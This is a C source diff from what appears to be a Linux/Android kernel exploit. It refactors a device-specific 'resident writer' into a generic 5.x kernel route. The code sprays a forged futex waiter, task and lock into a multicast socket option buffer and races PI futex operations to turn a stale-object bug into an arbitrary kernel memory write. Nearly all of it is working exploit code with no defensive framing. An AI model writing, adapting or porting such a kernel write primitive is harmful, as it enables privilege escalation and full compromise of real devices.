@@ -12,8 +12,8 @@ extern int pselect_custom_write;
 int route_last_step;
 int route_last_errno;
 
-/* Xperia 5.15 route. The multicast option buffer overlaps the stale compact
- * waiter. These helpers are selected only for profiles with mcast_waiter_off. */
+/* 5.x kernel route. The multicast option buffer overlaps the stale compact
+ * waiter. Profiles opt in with kernel_major=5 and mcast_waiter_off. */
 static uint32_t mr_l1, mr_l2, mr_cond;
 static pthread_t mr_tx, mr_ty;
 static atomic_int mr_y_l2, mr_x_l1, mr_y_wait, mr_x_wait, mr_y_done;
@@ -30,10 +30,13 @@ static long mr_adjust(void) {
   return r;
 }
 static void mr_stamp(uintptr_t target, uintptr_t value, uintptr_t lock) {
-  unsigned char b[0x108]; size_t o = active_offsets->mcast_waiter_off;
+  size_t size = active_offsets->mcast_buffer_size;
+  unsigned char b[size];
+  size_t o = active_offsets->mcast_waiter_off;
   memset(b, 0, sizeof(b));
   if (target) { put64(b, o, (target - 8) & ~(uintptr_t)3); put64(b, o + 8, value); }
-  put64(b, o + 0x30, mr_task); put64(b, o + 0x38, lock);
+  put64(b, o + active_offsets->mcast_task_offset, mr_task);
+  put64(b, o + active_offsets->mcast_lock_offset, lock);
   uint16_t family = AF_UNSPEC; memcpy(b + 8, &family, sizeof(family));
   setsockopt(mr_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, b, sizeof(b));
 }
@@ -51,7 +54,9 @@ static void *mr_y(void *arg) {
   mr_stamp(0, 0, mr_lock); atomic_store(&mr_y_done, 1);
   while (!atomic_load(&mr_stop)) {
     if (atomic_exchange(&mr_respray, 0)) {
-      uintptr_t lock = mr_lock + 0x80 + (mr_lock_slot++ % 12) * 8;
+      uintptr_t lock = mr_lock + active_offsets->mcast_lock_slots_offset +
+          (mr_lock_slot++ % active_offsets->mcast_lock_slot_count) *
+              active_offsets->mcast_lock_slot_stride;
       mr_stamp(mr_target, mr_value, lock); atomic_store(&mr_sprayed, 1);
     }
     sched_yield();
@@ -72,10 +77,11 @@ static void *mr_x(void *arg) {
   futex_op(&mr_l2, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
   atomic_store(&mr_x_done, 1); return NULL;
 }
-int mcast_resident_start(void) {
+int kernel5_resident_start(void) {
   if (mr_ready) return 1;
   uintptr_t bss = data_addr(KIMAGE_TEXT_BASE + active_offsets->off_mcast_fake_bss);
-  mr_lock = bss + 0x1200; mr_task = mr_lock + 0x2000;
+  mr_lock = bss + active_offsets->mcast_fake_lock_offset;
+  mr_task = bss + active_offsets->mcast_fake_task_offset;
   mr_l1=mr_l2=mr_cond=0; mr_policy=SCHED_NORMAL; mr_lock_slot=0;
   atomic_store(&mr_y_l2,0); atomic_store(&mr_x_l1,0); atomic_store(&mr_y_wait,0);
   atomic_store(&mr_x_wait,0); atomic_store(&mr_y_done,0); atomic_store(&mr_stop,0);
@@ -91,30 +97,30 @@ int mcast_resident_start(void) {
   for(int i=0;i<10000000&&!atomic_load(&mr_y_done);i++) sched_yield();
   if(!atomic_load(&mr_y_done) || mr_adjust()<0) return 0;
   usleep(100000); mr_ready=1;
-  pr_success("5.15 resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",bss,mr_lock,mr_task);
+  pr_success("5.x resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",bss,mr_lock,mr_task);
   return 1;
 }
-int mcast_resident_write(uintptr_t target, uintptr_t value) {
+int kernel5_resident_write(uintptr_t target, uintptr_t value) {
   if(!mr_ready) return 0; mr_target=target; mr_value=value;
   atomic_store(&mr_sprayed,0); atomic_store(&mr_respray,1);
   while(!atomic_load(&mr_sprayed)) sched_yield();
   long r=mr_adjust(); pr_info("resident write 0x%zx -> 0x%zx ret=%ld\n",value,target,r);
   return r==0;
 }
-void mcast_resident_stop(void) {
+void kernel5_resident_stop(void) {
   if(!mr_ready) return; atomic_store(&mr_stop,1);
   pthread_join(mr_ty,NULL); pthread_join(mr_tx,NULL); mr_ready=0;
   close_reclaim_sockets(); cleanup_page_prepare_state();
-  pr_success("5.15 resident writer disarmed\n");
+  pr_success("5.x resident writer disarmed\n");
 }
 
-void do_mcast_fake_lock_route(void) {
-  enum { STAMP_SIZE = 0x108 };
+void do_kernel5_fake_lock_route(void) {
+  size_t stamp_size = active_offsets->mcast_buffer_size;
   size_t waiter_off = (size_t)active_offsets->mcast_waiter_off;
-  unsigned char stamp[STAMP_SIZE];
+  unsigned char stamp[stamp_size];
   memset(stamp, 0, sizeof(stamp));
-  put64(stamp, waiter_off + 0x30, fake_task);
-  put64(stamp, waiter_off + 0x38, fake_lock);
+  put64(stamp, waiter_off + active_offsets->mcast_task_offset, fake_task);
+  put64(stamp, waiter_off + active_offsets->mcast_lock_offset, fake_lock);
   uint16_t family = AF_UNSPEC;
   memcpy(stamp + 8, &family, sizeof(family));
 
